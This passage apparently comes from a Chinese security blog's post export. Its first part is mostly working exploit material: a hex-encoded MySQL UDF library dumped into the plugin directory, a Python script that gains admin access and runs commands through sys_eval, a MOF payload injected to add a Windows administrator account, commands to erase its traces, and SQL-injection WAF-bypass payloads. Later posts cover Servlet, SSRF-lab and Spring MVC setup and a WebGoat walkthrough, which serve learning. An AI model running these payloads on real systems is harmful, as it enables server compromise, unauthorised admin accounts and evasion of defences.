E0C000000000000AE0C000000000000BE0C0000000000008017200000000000004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200002E7368737472746162002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E64796E616D6963002E676F74002E676F742E706C74002E64617461002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000B000000F6FFFF6F0200000000000000A002000000000000A002000000000000C000000000000000030000000000000008000000000000000000000000000000150000000B00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001D00000003000000020000000000000068070000000000006807000000000000E00100000000000000000000000000000100000000000000000000000000000025000000FFFFFF6F020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000FEFFFF6F0200000000000000A009000000000000A009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000C009000000000000C00900000000000060000000000000000300000000000000080000000000000018000000000000004B000000040000000200000000000000200A000000000000200A0000000000008001000000000000030000000A0000000800000000000000180000000000000055000000010000000600000000000000A00B000000000000A00B000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000B80B000000000000B80B00000000000010010000000000000000000000000000040000000000000010000000000000005B000000010000000600000000000000D00C000000000000D00C000000000000A80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000E000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000DD000000000000000000000000000000010000000000000001000000000000006F000000010000000200000000000000641200000000000064120000000000009C000000000000000000000000000000040000000000000000000000000000007D000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008E000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009A000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000A3000000010000000300000000000000D016200000000000D0160000000000001800000000000000000000000000000008000000000000000800000000000000A8000000010000000300000000000000E816200000000000E8160000000000009800000000000000000000000000000008000000000000000800000000000000B1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000B7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000BC000000010000000000000000000000000000000000000088170000000000009B000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000C500000000000000000000000000000001000000000000000000000000000000 into dumpfile '/usr/lib64/mysql/plugin/exp.so';\\x23\",\n        f\"&#123;getRadmonStr()&#125;';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'exp.so';\\x23\",\n        f\"&#123;getRadmonStr()&#125;';select sys_eval(\\\"&#123;CMD&#125;\\\");\\x23\"\n    ]\n    pocStudentId = []\n    for i in poc:\n        pocStudentId.append(reg(i))\n    print(\"[*]Ready to get admin\")\n    login(poc[0], pocStudentId[0])\n    postAns()\n    print(f\"[*][?]set admin passwd: &#123;passwd&#125;\")\n\n    logout()\n    if \"something err0r\" not in (login(\"admin\", passwd)):\n        print(\"[+]login as admin success!\")\n    else:\n        exit(\"[-]login as admin fail!\")\n\n    print(\"[*]write out file\")\n    posScore(pocStudentId[1])\n\n    print(\"[*]create function\")\n    posScore(pocStudentId[2])\n\n    print(f\"[*]exec cmd: &#123;CMD&#125;\")\n    posScore(pocStudentId[3])\n\n反弹 shell 之后的成果：\n4. 久远的 MOF 提权这块没有找到相对应的靶场，我觉得毕竟是 Windows 2003 这种的漏洞，相对应的复现成本也会比较高，就直接看国光师傅的这个环境好了 ~\n\nMOF 的提权是很久远的一种洞了，基本在 Windows Server 2003 的环境下才可以成功。相比于前面几种的 getshell 方式，MOF 在实战中用的很少。\n\n漏洞原理\nC:/Windows/system32/wbem/mof/ 目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令。\n如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。\n我们先构造恶意的 MOF 文件出来，EXP 如下\n#pragma namespace(&quot;\\\\\\\\.\\\\root\\\\subscription&quot;) \n\ninstance of __EventFilter as $EventFilter \n&#123; \n    EventNamespace &#x3D; &quot;Root\\\\Cimv2&quot;; \n    Name  &#x3D; &quot;filtP2&quot;; \n    Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot; \n            &quot;Where TargetInstance Isa \\&quot;Win32_LocalTime\\&quot; &quot; \n            &quot;And TargetInstance.Second &#x3D; 5&quot;; \n    QueryLanguage &#x3D; &quot;WQL&quot;; \n&#125;; \n\ninstance of ActiveScriptEventConsumer as $Consumer \n&#123; \n    Name &#x3D; &quot;consPCSV2&quot;; \n    ScriptingEngine &#x3D; &quot;JScript&quot;; \n    ScriptText &#x3D; \n&quot;var WSH &#x3D; new ActiveXObject(\\&quot;WScript.Shell\\&quot;)\\nWSH.run(\\&quot;net.exe user hacker P@ssw0rd &#x2F;add\\&quot;)\\nWSH.run(\\&quot;net.exe localgroup administrators hacker &#x2F;add\\&quot;)&quot;; \n&#125;; \n\ninstance of __FilterToConsumerBinding \n&#123; \n    Consumer   &#x3D; $Consumer; \n    Filter &#x3D; $EventFilter; \n&#125;;\n\n核心语句是这一句\nvar WSH &#x3D; new ActiveXObject(\\&quot;WScript.Shell\\&quot;)\\nWSH.run(\\&quot;net.exe user hacker P@ssw0rd &#x2F;add\\&quot;)\\nWSH.run(\\&quot;net.exe localgroup administrators hacker &#x2F;add\\&quot;)\n\n然后我们通过 into outfile&#x2F;dumpfile 的写入方式，通过注入写入文件：\n1&#39; select 0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A into dumpfile &quot;C:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;test.mof&quot;;  \n\n执行成功的的时候，test.mof 会出现在：c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;goog&#x2F; 目录下 否则出现在 c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;bad 目录下：\n\n\n\n国光师傅这里还提到了对于 MOF 提权是需要清理痕迹的。\n\n因为每隔几分钟时间又会重新执行添加用户的命令，所以想要清理痕迹得先暂时关闭 winmgmt 服务再删除相关 mof 文件，这个时候再删除用户才会有效果：\n# 停止 winmgmt 服务\nnet stop winmgmt\n\n# 删除 Repository 文件夹\nrmdir /s /q C:\\Windows\\system32\\wbem\\Repository\\\n\n# 手动删除 mof 文件\ndel C:\\Windows\\system32\\wbem\\mof\\good\\test.mof /F /S\n\n# 删除创建的用户\nnet user hacker /delete\n\n# 重新启动服务\nnet start winmgmt\n\n0x04 小结其实最近面试下来，如果是考到 SQL 注入 getshell 这一块的话，实操过与只是懂理论差距还是很大的，写这篇文章希望对师傅们有所帮助 ~\n0x05 参考资料https://www.sqlsec.com/2020/11/mysql.htmlhttps://www.sqlsec.com/2020/05/sqlilabs.htmlhttps://www.freebuf.com/vuls/334032.htmlhttps://www.wolai.com/nepnep/g2DTj6mRtBk2mikVuCyaE6\n","categories":["web安全"],"tags":["web安全"]},{"title":"SQL注入绕过姿势","url":"/2021/11/30/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/","content":"SQL注入绕过姿势\n\n0x01 对于SQL查询的基础语句先看一看正常的登录语句\nselect * from ctf where username='$username' and password='$password'; \n\n如果单引号被过滤的时候，将前面username中的&#39;进行注释，尝试与password中的&#39;拼接。\n常用的注释符：\n1）– 注释内容\n2）# 注释内容\n3）/*注释内容*/\n例如：union select 1,2#\n这样子构造的闭合就是：1&#39; union select 1,2#\n0x02 针对waf正则对大小写不敏感的情况使用大小写绕过：\n1' uNiOn seLeCt 1,2,3#\n\n0x03关键字被过滤，需要双写绕过当部分关键字被过滤，例如union,select,information等关键字被过滤的时候，可以尝试双写绕过\n原本的payload:\n1' union select 1,2#\n\n改为 1' ununionion selselectect 1,2#\n\n0x04特殊编码绕过1）十六进制绕过\nUNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B\n\n2）ascii编码绕过\nTest =CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)\n\n3）Unicode编码\n常用的几个符号的一些Unicode编码：\n单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7\n空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0\n左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8\n右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9\n","categories":["web安全"],"tags":["web安全"]},{"title":"Servlet 项目搭建","url":"/2022/08/22/Servlet-%E9%A1%B9%E7%9B%AE%E6%90%AD%E5%BB%BA/","content":"Servlet 项目搭建\n\n文章重新更新于 2022.9.6，因为后续搭建出了大问题，已修复\nServlet 项目搭建0x01 前言看很多大师傅的文章，对分析内存马写的都挺好的，但是都没有说环境怎么怎么搭建，大部分都是引用其他人的。\n我决定自己写一篇文章，为正在学习内存马的师傅们避个坑。\n0x02 基础环境搭建\njdk8u312\nMaven 3.6.3\nIDEA 2021.2.1\n\n这里没有借鉴任何其他文章，完全是自己手工搭建了一遍，其实根本没那么复杂。\n新建项目，选择 enterprise，这个地方要注意，选择 Web Application，而不是 Rest Service。\n\n\n下一步这里，什么都不需要选。\n\n\n后续根本不需要配置什么 web.xml，也不需要添加什么 classes 文件夹，lib 文件夹，根本没必要。\n因为我们选择的是 Web Application 4.0，可以直接在类里面用注解配置，比如 Servlet ———— @WebServlet(&quot;/servlet&quot;)，在访问 &#x2F;servlet 的时候调用此 Servlet\n但是有时候为了分析还是需要加上 web.xml，会简易一点\n搭完了之后要用 maven 把 tomcat 的包打进去，很坑。\nxml 代码如下\n&lt;dependency>  \n    &lt;groupId>org.apache.tomcat&lt;/groupId>  \n    &lt;artifactId>tomcat-catalina&lt;/artifactId>  \n    &lt;version>8.5.0&lt;/version>  \n&lt;/dependency>  \n&lt;dependency>  \n    &lt;groupId>org.apache.tomcat.embed&lt;/groupId>  \n    &lt;artifactId>tomcat-embed-el&lt;/artifactId>  \n    &lt;version>8.5.15&lt;/version>  \n&lt;/dependency>\n\n0x03 为什么要重新写一下如何搭建\n当时发现太坑了，因为我们如果新建了 classes，并且设置输出，有时候会设置失败的。\n\n遇到的情况是 500 的报错，其实就是没有 .class 输出，这是啥意思呢？\n我们平常编译，都是有一个 target 文件夹的，里面放的是 .class 的文件，这个 .class 的文件如果没有，就会报 500 的那个错误，并且报错是 ClassNotFound\n所以才会这样，醉了。\n第二种搭建方式更新于 2022-10-28\n是在学习狂神 SpringMVC 视频的时候学到的，先起一个项目，然后删除 src 文件夹。\n接着新建 module，在 module 里面 add framework，选择 web application 即可。\n其实一开始我也是这样创建的，但是坑就坑在，还要导入 jsp 的包，如下\n&lt;dependencies>  \n&lt;dependency>  \n    &lt;groupId>javax.servlet&lt;/groupId>  \n    &lt;artifactId>servlet-api&lt;/artifactId>  \n    &lt;version>2.5&lt;/version>  \n&lt;/dependency>  \n&lt;dependency>  \n    &lt;groupId>javax.servlet.jsp&lt;/groupId>  \n    &lt;artifactId>jsp-api&lt;/artifactId>  \n    &lt;version>2.2&lt;/version>  \n&lt;/dependency>  \n&lt;/dependencies>\n\n父类的 pom.xml 如下\n&lt;dependencies>  \n    &lt;dependency>  \n        &lt;groupId>junit&lt;/groupId>  \n        &lt;artifactId>junit&lt;/artifactId>  \n        &lt;version>4.12&lt;/version>  \n    &lt;/dependency>  \n    &lt;dependency>  \n        &lt;groupId>org.springframework&lt;/groupId>  \n        &lt;artifactId>spring-webmvc&lt;/artifactId>  \n        &lt;version>5.1.9.RELEASE&lt;/version>  \n    &lt;/dependency>  \n    &lt;dependency>  \n        &lt;groupId>javax.servlet&lt;/groupId>  \n        &lt;artifactId>servlet-api&lt;/artifactId>  \n        &lt;version>2.5&lt;/version>  \n    &lt;/dependency>  \n    &lt;dependency>  \n        &lt;groupId>javax.servlet.jsp&lt;/groupId>  \n        &lt;artifactId>jsp-api&lt;/artifactId>  \n        &lt;version>2.2&lt;/version>  \n    &lt;/dependency>  \n    &lt;dependency>  \n        &lt;groupId>javax.servlet&lt;/groupId>  \n        &lt;artifactId>jstl&lt;/artifactId>  \n        &lt;version>1.2&lt;/version>  \n    &lt;/dependency>  \n&lt;/dependencies>\n\n踩坑这其实还会有点小问题，有时候 Tomcat 的项目会 404，这是因为没有导入 lib；\n创建一个 lib，接着导入包即可。\n\n\n\n\nCSDN 上有很多文章是没有提及这个的，太坑了。\n第三种搭建方式详见 Struts2 搭建的文章，也是一样的，需要寻找 web-app\n","categories":["环境搭建"],"tags":["环境搭建"]},{"title":"SSRF-Lab环境搭建","url":"/2022/05/16/SSRF-Lab%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","content":"SSRF-Lab环境搭建\n\nSSRF-Lab环境搭建0x01 前言废话就不多说了，主要还是搭环境，更好的学习 SSRF，我坚信只了解，不上手是不行的。\n0x02 环境准备机器：Debian 10什么机器是没有限制的，不论 centos，Ubuntu\n1. 安装 docker这应该比较简单吧\nsudo apt-get update\nsudo apt-get install docker\nsudo apt-get install docker-compose\n\n2. 搭建 SSRF-Lab先按照下面的命令把basic这一关搭建好，其他的基本相同。在创建容器的时候避免出冲突，端口 8999 在设置要注意，避免与本地已开启端口产生冲突。如果不想起 8999 端口的话修改 Docekrfile 就好了。\n因为我这里是 Debian 的机子，所以会先自动拉 Ubuntu 的镜像，不要慌，拉了没事的。\n$ git clone https://github.com/m6a-UdS/ssrf-lab.git  \n$ cd ~/ssrf-lab/basics #进入basics文件夹  \n$ sudo docker build -t ssrf-lab/basic . #构建镜像  \n$ sudo docker run -d -p 8999:80 ssrf-lab/basic #创建容器  \n$ sudo docker ps #查看ssrf-lab/basic容器编号  \n$ sudo docker stop [容器编号] #关闭容器，一般学完就关掉，防止被别人日\n\n在 Advances 系列的文件夹还有 ctf 中没有 Dockerfile 文件，只有docker-compose.yml文件，这时候我们就要在构建镜像的时候就换 docker-compose 来创建镜像并开启容器了。或者自己写 Dockerfile 也可以。\n访问 ip+8999 端口即可\n\n\n0x03 参考资料SSRF-LABS指南 | Se8S0n  这位师傅讲的超级清楚了。\n","categories":["环境搭建"],"tags":["环境搭建"]},{"title":"Spring MVC 开发学习","url":"/2022/10/28/Spring-MVC-%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/","content":"Spring MVC 开发学习\n\nSpring MVC 开发学习0x00 前言最近有点小迷茫，效率也不是很高，打算学完这个就跟一些 Spring 类型的漏洞复现吧，可能也会看 Struts2 的。\n0x01 回顾MVC1.1 什么是MVC\nMVC是模型(Model)、视图(View)、控制器(Controller)的简写，是一种软件设计规范。\n是将业务逻辑、数据、显示分离的方法来组织代码。\nMVC主要作用是降低了视图与业务逻辑间的双向偶合。\nMVC不是一种设计模式，MVC是一种架构模式。当然不同的MVC存在差异。\n\nModel（模型）：数据模型，提供要展示的数据，因此包含数据和行为，可以认为是领域模型或JavaBean组件（包含数据和行为），不过现在一般都分离开来：Value Object（数据Dao） 和 服务层（行为Service）。也就是模型提供了模型数据查询和模型数据的状态更新等功能，包括数据和业务。\nView（视图）：负责进行模型的展示，一般就是我们见到的用户界面，客户想看到的东西。\nController（控制器）：接收用户请求，委托给模型进行处理（状态改变），处理完毕后把返回的模型数据返回给视图，由视图负责展示。也就是说控制器做了个调度员的工作。\n最典型的MVC就是JSP + servlet + javabean的模式。\n\n\n1.2 Model1时代\n在web早期的开发中，通常采用的都是Model1。\nModel1中，主要分为两层，视图层和模型层。\n\n\n\nModel1优点：架构简单，比较适合小型项目开发；\nModel1缺点：JSP职责不单一，职责过重，不便于维护；\n1.3 Model2时代Model2把一个项目分成三部分，包括视图、控制、模型。\n\n\n\n用户发请求\nServlet接收请求数据，并调用对应的业务逻辑方法\n业务处理完毕，返回更新后的数据给servlet\nservlet转向到JSP，由JSP来渲染页面\n响应给前端更新后的页面\n\n职责分析：\nController：控制器\n\n取得表单数据\n调用业务逻辑\n转向指定的页面\n\nModel：模型\n\n业务逻辑\n保存数据的状态\n\nView：视图\n回顾 Servlet\n显示页面\n\nModel2这样不仅提高的代码的复用率与项目的扩展性，且大大降低了项目的维护成本。Model 1模式的实现比较简单，适用于快速开发小规模项目，Model1中JSP页面身兼View和Controller两种角色，将控制逻辑和表现逻辑混杂在一起，从而导致代码的重用性非常低，增加了应用的扩展性和维护的难度。Model2消除了Model1的缺点。\n新建项目，用 module 的形式\n这里略，放一下父类 pom.xml 以及子类 pom.xml 的内容\n父类的 pom.xml\n&lt;dependencies>\n   &lt;dependency>\n       &lt;groupId>junit&lt;/groupId>\n       &lt;artifactId>junit&lt;/artifactId>\n       &lt;version>4.12&lt;/version>\n   &lt;/dependency>\n   &lt;dependency>\n       &lt;groupId>org.springframework&lt;/groupId>\n       &lt;artifactId>spring-webmvc&lt;/artifactId>\n       &lt;version>5.1.9.RELEASE&lt;/version>\n   &lt;/dependency>\n   &lt;dependency>\n       &lt;groupId>javax.servlet&lt;/groupId>\n       &lt;artifactId>servlet-api&lt;/artifactId>\n       &lt;version>2.5&lt;/version>\n   &lt;/dependency>\n   &lt;dependency>\n       &lt;groupId>javax.servlet.jsp&lt;/groupId>\n       &lt;artifactId>jsp-api&lt;/artifactId>\n       &lt;version>2.2&lt;/version>\n   &lt;/dependency>\n   &lt;dependency>\n       &lt;groupId>javax.servlet&lt;/groupId>\n       &lt;artifactId>jstl&lt;/artifactId>\n       &lt;version>1.2&lt;/version>\n   &lt;/dependency>\n&lt;/dependencies>\n\n子类的 pom.xml\n&lt;dependency>\n   &lt;groupId>javax.servlet&lt;/groupId>\n   &lt;artifactId>servlet-api&lt;/artifactId>\n   &lt;version>2.5&lt;/version>\n&lt;/dependency>\n&lt;dependency>\n   &lt;groupId>javax.servlet.jsp&lt;/groupId>\n   &lt;artifactId>jsp-api&lt;/artifactId>\n   &lt;version>2.2&lt;/version>\n&lt;/dependency>\n\n\n编写一个Servlet类，用来处理用户的请求\n\n编写test.jsp，在WEB-INF目录下新建一个jsp的文件夹，新建test.jsp\n\n配置Tomcat，并启动测试\n\n\n\nlocalhost:8080&#x2F;hello?method&#x3D;add\nlocalhost:8080&#x2F;hello?method&#x3D;delete\n\nMVC框架要做哪些事情\n\n将url映射到java类或java类的方法 .\n封装用户提交的数据 .\n处理请求–调用相关的业务处理–封装响应数据 .\n将响应的数据进行渲染 . jsp &#x2F; html 等表示层数据 .\n\n说明：\n常见的服务器端MVC框架有：Struts、Spring MVC、ASP.NET MVC、Zend Framework、JSF；常见前端MVC框架：vue、angularjs、react、backbone；由MVC演化出了另外一些模式如：MVP、MVVM 等等….\n2、什么是SpringMVC2.1 概述Spring MVC是Spring Framework的一部分，是基于Java实现MVC的轻量级Web框架。\n查看官方文档：https://docs.spring.io/spring/docs/5.2.0.RELEASE/spring-framework-reference/web.html#spring-web\n我们为什么要学习SpringMVC呢?\nSpring MVC的特点：\n\n轻量级，简单易学\n高效 , 基于请求响应的MVC框架\n与Spring兼容性好，无缝结合\n约定优于配置\n功能强大：RESTful、数据验证、格式化、本地化、主题等\n简洁灵活\n\nSpring的web框架围绕DispatcherServlet [ 调度Servlet ] 设计。\n2.2 中心控制器Spring的web框架围绕DispatcherServlet设计。DispatcherServlet的作用是将请求分发到不同的处理器。从Spring 2.5开始，使用Java 5或者以上版本的用户可以采用基于注解的controller声明方式。\nSpring MVC框架像许多其他MVC框架一样, 以请求为驱动 , 围绕一个中心Servlet分派请求及提供其他功能，**DispatcherServlet是一个实际的Servlet (它继承自HttpServlet 基类)**。\nSpringMVC的原理如下图所示：\n当发起请求时被前置的控制器拦截到请求，根据请求参数生成代理请求，找到请求对应的实际控制器，控制器处理请求，创建数据模型，访问数据库，将模型响应给中心控制器，控制器使用模型与视图渲染视图结果，将结果返回给中心控制器，再将结果返回给请求者。\n\n\n2.3 SpringMVC 执行原理\n\n图为SpringMVC的一个较完整的流程图，实线表示SpringMVC框架提供的技术，不需要开发者实现，虚线表示需要开发者实现。\n简要分析执行流程\n\nDispatcherServlet表示前置控制器，是整个SpringMVC的控制中心。用户发出请求，DispatcherServlet接收请求并拦截请求。 我们假设请求的url为 : http://localhost:8080/SpringMVC/hello 如上url拆分成三部分： http://localhost:8080服务器域名 SpringMVC部署在服务器上的web站点 hello表示控制器 通过分析，如上url表示为：请求位于服务器localhost:8080上的SpringMVC站点的hello控制器。\nHandlerMapping为处理器映射。DispatcherServlet调用HandlerMapping，HandlerMapping根据请求url查找Handler。\nHandlerExecution表示具体的Handler,其主要作用是根据url查找控制器，如上url被查找控制器为：hello。\nHandlerExecution将解析后的信息传递给DispatcherServlet,如解析控制器映射等。\nHandlerAdapter表示处理器适配器，其按照特定的规则去执行Handler。\nHandler让具体的Controller执行。\nController将具体的执行信息返回给HandlerAdapter,如ModelAndView。\nHandlerAdapter将视图逻辑名或模型传递给DispatcherServlet。\nDispatcherServlet调用视图解析器(ViewResolver)来解析HandlerAdapter传递的逻辑视图名。\n视图解析器将解析的逻辑视图名传给DispatcherServlet。\nDispatcherServlet根据视图解析器解析的视图结果，调用具体的视图。\n最终视图呈现给用户。\n\n3、第一个MVC程序3.1 配置版\n新建一个Moudle ， springmvc-02-hello ， 添加web的支持！\n确定导入了SpringMVC 的依赖！\n配置web.xml ， 注册DispatcherServlet\n\n因为 hexo matery 主题不支持 XML 格式带注释，会引起乱码，具体的注释可以在我项目包里面查看。\nhttps://github.com/Drun1baby/JavaSecurityLearning\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n \n    &lt;servlet>\n        &lt;servlet-name>springmvc&lt;/servlet-name>\n        &lt;servlet-class>org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class>\n        &lt;init-param>\n            &lt;param-name>contextConfigLocation&lt;/param-name>\n            &lt;param-value>classpath:springmvc-servlet.xml&lt;/param-value>\n        &lt;/init-param>\n        &lt;load-on-startup>1&lt;/load-on-startup>\n    &lt;/servlet>\n\n    &lt;servlet-mapping>\n        &lt;servlet-name>springmvc&lt;/servlet-name>\n        &lt;url-pattern>/&lt;/url-pattern>\n    &lt;/servlet-mapping>\n&lt;/web-app>\n\n\n编写SpringMVC 的 配置文件！名称：springmvc-servlet.xml : servletname-servlet.xml 说明，这里的名称要求是按照官方来的\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n&lt;beans xmlns=\"http://www.springframework.org/schema/beans\"\n      xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n      xsi:schemaLocation=\"http://www.springframework.org/schema/beans\n       http://www.springframework.org/schema/beans/spring-beans.xsd\">\n \n&lt;/beans>\n\n\n添加 处理映射器（可省略）\n\n&lt;bean class=\"org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter\"/>\n\n\n添加 处理器适配器（可省略）\n\n&lt;bean class=\"org.springframework.web.servlet.mvc.SimpleControllerHandlerAdapter\"/>\n\n\n添加 视图解析器\n\n&lt;bean class=\"org.springframework.web.servlet.view.InternalResourceViewResolver\" id=\"InternalResourceViewResolver\">\n   &lt;property name=\"prefix\" value=\"/WEB-INF/jsp/\"/>\n   &lt;property name=\"suffix\" value=\".jsp\"/>\n&lt;/bean>\n\n\n编写我们要操作业务Controller ，要么实现Controller接口，要么增加注解；需要返回一个ModelAndView，装数据，封视图；\n\npackage com.example.controller;\n \nimport org.springframework.web.servlet.ModelAndView;\nimport org.springframework.web.servlet.mvc.Controller;\n \nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n \npublic class HelloController implements Controller &#123;\n    public ModelAndView handleRequest(HttpServletRequest request, HttpServletResponse response) throws Exception &#123;\n        //ModelAndView 模型和视图\n        ModelAndView mv = new ModelAndView();\n \n        //封装对象，放在ModelAndView中。Model\n        mv.addObject(\"msg\",\"HelloSpringMVC!\");\n        //封装要跳转的视图，放在ModelAndView中\n        mv.setViewName(\"hello\"); //: /WEB-INF/jsp/hello.jsp\n        return mv;\n    &#125;\n&#125;\n\n\n将自己的类交给SpringIOC容器，注册bean，这一步千万别忘了，因为根据 Spring IoC 的原理，是需要这么一步的，当时我自己在学习的时候没写这个总觉得少了点什么\n\n&lt;bean id=\"/hello\" class=\"com.example.controller.HelloController\"/>\n\n\n写要跳转的jsp页面，显示ModelandView存放的数据，以及我们的正常页面；\n\n&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n&lt;html>\n&lt;head>\n    &lt;title>Title&lt;/title>\n&lt;/head>\n&lt;body>\n$&#123;msg&#125;\n&lt;/body>\n&lt;/html>\n\n\n配置Tomcat 启动测试！\n\n\n\n这里是容易踩坑的，我把解决方法放在了这里\nServlet 项目搭建\n\n自己的理解：\n\n首先 web.xml 当中注册了 DispatcherServlet，接着，我们需要关联一个 springmvc 的配置文件，这个配置文件是作为 DispatcherServlet 的 init-param。\n可能遇到的问题：访问出现404，排查步骤：\n\n查看控制台输出，看一下是不是缺少了什么 jar 包。\n如果 jar 包存在，显示无法输出，就在 IDEA 的项目发布中，添加 lib 依赖！\n重启 Tomcat 即可解决！\n\n3.2 注解版\n新建一个 Moudle，springmvc-03-hello-annotation 。添加 web 支持！\n由于 Maven 可能存在资源过滤的问题，我们将配置完善\n\n","categories":["Java 开发"],"tags":["Java 开发"]},{"title":"WebGoat代码审计-01-基础General","url":"/2022/03/14/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-01-%E5%9F%BA%E7%A1%80General/","content":"WebGoat代码审计-01-基础General\n\n\nWebGoat代码审计-01-基础GeneralWebGoat 这节主要是针对 HTTP 请求的，基础的东西就不再赘述了。\n\n搭建完毕靶场后，进入第一课之前的 General 界面。\n\n0x01 前言，说一说为什么要用 WebGoatWebGoat 作为代码审计入门较好，我不认为一上来就去硬学那些 ThinkPHP 框架 RCE 的代码审计、各种 RCE 代码审计与原理学习是一件好事儿，万丈高楼平地起，一步一步来。\n0x02 HTTP Basics\n比较简单，就少写一点废话了\n\n1. HTTP Basics PageLesson2靶场界面，如图所示：\n\n\n输入数字，即可通过。\n\n\n\n毕竟做题是次要的，主要的是源码审计\n\n打开IDEA，找到HTTP Basics模块，开始代码审计。代码层面完全毫无安全性难度，挂张图，接着下一道。\n\n\n2. HTTP Basics PageLesson3靶场界面，如图所示：\n\n\n\n题目要求：先判断HTTP Basics发送HTTP请求是通过GET请求，还是POST请求；再输入数值。\n呃，没什么头绪，就先按照它说的做吧。\n\nBurpsuite简单抓包，发现界面采用的是POST请求方式。\n\n\n莫名其妙的报错，抓包后分析，尝试将”magic_num”与”magic_answer”设置成一样的参数，看一看回显如何。\n\n\n\n\n成功通过~\n\n老样子，代码审计\n\n\n\n我们看到这段主要的判断函数，把它单独拉出来\nif (\"POST\".equalsIgnoreCase(answer) &amp;&amp; magic_answer.equals(magic_num)) &#123;  \n    return success(this).build();\n\n\neasy~ 继续冲\n0x03 HTTP Proxies1. HTTP Proxies PageLesson6WebGoat花这么多的篇幅介绍了ZAP这一个渗透工具，个人觉得和Burpsuite差不多吧，所以就没装，直接看题。\n靶场界面，如图所示：\n\n\n题目里面就是教了一下基础的抓包，把POST修改成GET、添加x-request-intercepted:true，再把最下面一行删除即可~ easy\n\n\n修改之后的截图\n\n\n\n0x03 Developer Tools1.Developer Tools 